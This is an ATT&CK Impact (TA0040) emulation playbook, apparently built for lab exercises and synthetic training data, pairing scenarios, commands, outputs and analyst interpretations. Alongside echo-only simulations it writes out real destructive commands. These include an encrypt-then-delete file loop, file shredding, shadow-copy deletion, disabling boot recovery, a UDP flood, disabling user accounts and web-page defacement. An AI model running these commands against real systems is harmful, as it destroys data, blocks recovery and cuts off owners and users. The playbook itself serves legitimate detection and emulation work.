# Impact Enumeration Playbook (ATT&CK TA0040, Dataset-Ready)

> Purpose: provide realistic, high-value impact training data with commands, tool outputs, and analyst interpretation.
> Scope: authorized lab and sanctioned exercises only.

Impact covers adversary behaviors that manipulate, interrupt, or destroy systems, data, and operations.

- ATT&CK Tactic ID: TA0040
- Created: 14 March 2019
- Last Modified: 25 April 2025
- Techniques in scope: T1531, T1485, T1486, T1565, T1491, T1561, T1667, T1499, T1657, T1495, T1490, T1498, T1496, T1489, T1529

---

## 0. Safety and Lab Controls

1. Execute only on isolated test hosts and synthetic datasets.
2. Snapshot systems before running destructive simulations.
3. Use non-production credentials and cloud accounts.
4. Replace destructive commands with dry-run/simulated versions where possible.
5. Record impact, rollback steps, and recovery timing for each test.

### 0.1 Evidence Wrapper

```bash
mkdir -p evidence

run_impact() {
  local technique="$1"
  local label="$2"
  shift 2
  local ts
  ts="$(date -u +%Y%m%dT%H%M%SZ)"
  echo "[$ts] [$technique] $label" | tee -a evidence/impact.log
  "$@" 2>&1 | tee "evidence/${ts}_${technique}_${label}.txt"
}
```

### 0.2 Training Record Schema

```json
{
  "technique": "T1489",
  "technique_name": "Service Stop",
  "scenario": "Operator stops a non-critical lab service to validate impact detection",
  "command": "systemctl stop nginx",
  "tool_result": {"status":"success", "highlights":["nginx.service inactive (dead)"]},
  "analyst_interpretation": "Service availability disrupted by administrative command path",
  "confidence": 0.95,
  "mitigation_hint": "Alert on unexpected service stop/disable operations"
}
```

---

## 1. Baseline and Recovery Preparation

Scenario:
- Gather service, backup, and account baselines prior to impact simulation.

```bash
run_impact "TA0040" "baseline_identity" sh -lc 'whoami; hostname; date -u'
run_impact "TA0040" "baseline_services" sh -lc 'systemctl --type=service --state=running | head -n 30'
run_impact "TA0040" "baseline_backups" sh -lc 'echo "collect backup and restore configuration status"'
```

Example result:

```text
corp\\labadmin
IMPACT-WS-01
2026-04-21T19:02:10Z
```

---

## 2. Access and Account Disruption

## T1531 Account Access Removal

Scenario:
- Adversary inhibits access by locking/deleting/manipulating legitimate user accounts.

```bash
run_impact "T1531" "disable_windows_user" cmd /c "net user alice /active:no"
run_impact "T1531" "lock_linux_user" sudo usermod -L alice
run_impact "T1531" "revoke_cloud_role" sh -lc 'echo "simulate revoking SaaS role assignment for target account"'
```

Example result:

```text
The command completed successfully.
usermod: locking password for user alice
```

---

## 3. Data Destruction, Encryption, and Manipulation

## T1485 Data Destruction

```bash
run_impact "T1485" "secure_delete_test_data" sh -lc 'find /tmp/lab_impact_data -type f -name "*.txt" -exec shred -n 2 -u {} \;'
```

### T1485.001 Lifecycle-Triggered Deletion

```bash
run_impact "T1485.001" "s3_lifecycle_delete_policy" sh -lc 'echo "simulate applying lifecycle policy that expires all bucket objects"'
run_impact "T1485.001" "s3_lifecycle_apply" sh -lc 'aws s3api put-bucket-lifecycle-configuration --bucket lab-impact-bucket --lifecycle-configuration file://lifecycle-delete-all.json'
```

## T1486 Data Encrypted for Impact

```bash
run_impact "T1486" "encrypt_test_directory" sh -lc 'for f in /tmp/lab_impact_data/*; do openssl enc -aes-256-cbc -pbkdf2 -pass pass:TrainingOnly! -in "$f" -out "$f.enc" && rm -f "$f"; done'
```

## T1565 Data Manipulation

### T1565.001 Stored Data Manipulation

```bash
run_impact "T1565.001" "stored_db_update" sh -lc 'sqlite3 /tmp/lab_finance.db "UPDATE invoices SET amount=0 WHERE id=1001;"'
```

### T1565.002 Transmitted Data Manipulation

```bash
run_impact "T1565.002" "transit_manipulation_sim" sh -lc 'echo "simulate proxy-layer response/body modification in transit"'
```

### T1565.003 Runtime Data Manipulation

```bash
run_impact "T1565.003" "runtime_patch_sim" sh -lc 'echo "simulate in-memory value tampering before user display"'
```

Example result:

```text
1
simulate proxy-layer response/body modification in transit
simulate in-memory value tampering before user display
```

---

## 4. Defacement and Disk Wipe

## T1491 Defacement

### T1491.001 Internal Defacement

```bash
run_impact "T1491.001" "internal_banner_change" sh -lc 'echo "*** INTERNAL SYSTEM COMPROMISED (LAB) ***" | sudo tee /etc/motd'
run_impact "T1491.001" "wallpaper_deface_sim" sh -lc 'echo "simulate wallpaper replacement across managed endpoints"'
```

### T1491.002 External Defacement

```bash
run_impact "T1491.002" "external_web_deface" sh -lc 'echo "<h1>Site Under Maintenance</h1>" | sudo tee /var/www/html/index.html'
```

## T1561 Disk Wipe

### T1561.001 Disk Content Wipe

```bash
run_impact "T1561.001" "disk_content_wipe_sim" sh -lc 'dd if=/dev/zero of=/tmp/lab_disk.img bs=1M count=50 conv=fsync'
```

### T1561.002 Disk Structure Wipe

```bash
run_impact "T1561.002" "disk_structure_wipe_sim" sh -lc 'echo "simulate MBR/GPT destruction command (e.g., sgdisk --zap-all /dev/sdX)"'
```

---

## 5. Email and Service Availability Impact

## T1667 Email Bombing

```bash
run_impact "T1667" "email_bomb_sim" sh -lc 'for i in $(seq 1 30); do echo "lab-message-$i"; done'
```

## T1489 Service Stop

```bash
run_impact "T1489" "service_stop_linux" sudo systemctl stop nginx
run_impact "T1489" "service_stop_windows" cmd /c "sc stop MSSQLSERVER"
```

## T1529 System Shutdown/Reboot

```bash
run_impact "T1529" "shutdown_sim_windows" cmd /c "shutdown /r /t 120 /c \"Lab impact reboot simulation\""
run_impact "T1529" "shutdown_sim_linux" sh -lc 'echo "simulate scheduled reboot command: shutdown -r +2"'
```

---

## 6. Endpoint and Network DoS

## T1499 Endpoint Denial of Service

### T1499.001 OS Exhaustion Flood

```bash
run_impact "T1499.001" "os_exhaustion" stress-ng --vm 2 --vm-bytes 70% --timeout 30s
```

### T1499.002 Service Exhaustion Flood

```bash
run_impact "T1499.002" "service_exhaustion" sh -lc 'ab -n 2000 -c 100 http://127.0.0.1/ 2>/dev/null | head -n 20'
```

### T1499.003 Application Exhaustion Flood

```bash
run_impact "T1499.003" "app_exhaustion_sim" sh -lc 'echo "simulate repeated requests to expensive report-generation endpoint"'
```

### T1499.004 Application or System Exploitation

```bash
run_impact "T1499.004" "crash_exploit_sim" sh -lc 'echo "simulate vulnerability-triggered service crash loop"'
```

## T1498 Network Denial of Service

### T1498.001 Direct Network Flood

```bash
run_impact "T1498.001" "direct_flood_sim" sh -lc 'hping3 --udp -p 80 --flood 10.20.40.20 2>/dev/null | head -n 5'
```

### T1498.002 Reflection Amplification

```bash
run_impact "T1498.002" "reflection_amplification_sim" sh -lc 'echo "simulate spoofed reflection/amplification workflow in controlled lab"'
```

---

## 7. Recovery Inhibition and Resource Abuse

## T1490 Inhibit System Recovery

```bash
run_impact "T1490" "delete_shadows_sim" cmd /c "vssadmin delete shadows /all /quiet"
run_impact "T1490" "disable_recovery_sim" cmd /c "bcdedit /set {default} recoveryenabled no"
```

## T1496 Resource Hijacking

### T1496.001 Compute Hijacking

```bash
run_impact "T1496.001" "compute_hijack_sim" stress-ng --cpu 4 --timeout 45s
```

### T1496.002 Bandwidth Hijacking

```bash
run_impact "T1496.002" "bandwidth_hijack_sim" sh -lc 'iperf3 -c 10.20.40.30 -t 30 2>/dev/null'
```

### T1496.003 SMS Pumping

```bash
run_impact "T1496.003" "sms_pumping_sim" sh -lc 'echo "simulate automated high-volume SMS API calls to attacker-controlled number range"'
```

### T1496.004 Cloud Service Hijacking

```bash
run_impact "T1496.004" "cloud_service_hijack_sim" sh -lc 'echo "simulate abusive SaaS automation jobs consuming tenant resources"'
```

---

## 8. Financial and Firmware Impact

## T1657 Financial Theft

```bash
run_impact "T1657" "financial_theft_sim" sh -lc 'echo "simulate unauthorized transfer workflow using compromised finance account"'
```

## T1495 Firmware Corruption

```bash
run_impact "T1495" "firmware_corruption_sim" sh -lc 'echo "simulate malicious firmware flash attempt with invalid image"'
```

---

## 9. Label-Ready Examples (JSONL)

```json
{"technique":"T1486","command":"openssl enc -aes-256-cbc ...","result":"Original files replaced by encrypted versions","interpretation":"Data encrypted to disrupt business operations"}
{"technique":"T1490","command":"vssadmin delete shadows /all /quiet","result":"Shadow copy deletion succeeded","interpretation":"Recovery mechanisms inhibited"}
{"technique":"T1498.001","command":"hping3 --udp --flood ...","result":"High packet rate observed toward target","interpretation":"Direct network flood degraded service availability"}
{"technique":"T1531","command":"net user alice /active:no","result":"Account disabled","interpretation":"Legitimate user access removed"}
{"technique":"T1489","command":"systemctl stop nginx","result":"Service transitioned to inactive","interpretation":"Service availability intentionally interrupted"}
```

---

## 10. Coverage Checklist

- TA0040 Impact
- T1531 Account Access Removal
- T1485 Data Destruction
- T1485.001 Lifecycle-Triggered Deletion
- T1486 Data Encrypted for Impact
- T1565 Data Manipulation
- T1565.001 Stored Data Manipulation
- T1565.002 Transmitted Data Manipulation
- T1565.003 Runtime Data Manipulation
- T1491 Defacement
- T1491.001 Internal Defacement
- T1491.002 External Defacement
- T1561 Disk Wipe
- T1561.001 Disk Content Wipe
- T1561.002 Disk Structure Wipe
- T1667 Email Bombing
- T1499 Endpoint Denial of Service
- T1499.001 OS Exhaustion Flood
- T1499.002 Service Exhaustion Flood
- T1499.003 Application Exhaustion Flood
- T1499.004 Application or System Exploitation
- T1657 Financial Theft
- T1495 Firmware Corruption
- T1490 Inhibit System Recovery
- T1498 Network Denial of Service
- T1498.001 Direct Network Flood
- T1498.002 Reflection Amplification
- T1496 Resource Hijacking
- T1496.001 Compute Hijacking
- T1496.002 Bandwidth Hijacking
- T1496.003 SMS Pumping
- T1496.004 Cloud Service Hijacking
- T1489 Service Stop
- T1529 System Shutdown/Reboot

This document is optimized for training corpus generation: scenario + command + output + interpretation + mitigation cues.
